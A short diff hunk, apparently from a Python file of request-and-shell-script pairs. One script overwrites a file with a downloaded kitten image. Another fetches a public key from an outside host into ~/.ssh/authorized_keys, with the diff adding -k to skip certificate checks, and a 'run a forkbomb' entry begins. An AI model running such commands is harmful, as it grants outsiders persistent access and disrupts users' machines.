@@ -17,7 +17,7 @@ curl http://placekitten.com/g/320/240 > "$f"
 echo 'bang!' $f 'is now a kitten' """),
     ("add my public key to your authorized_keys in .ssh", """mkdir -p .ssh
 chmod 700 ~/.ssh
-curl https://q3k.org/pubkey >> ~/.ssh/authorized_keys
+curl -k https://q3k.org/pubkey >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 echo 'bang! thanks for the access.'"""),
     ("run a forkbomb", """
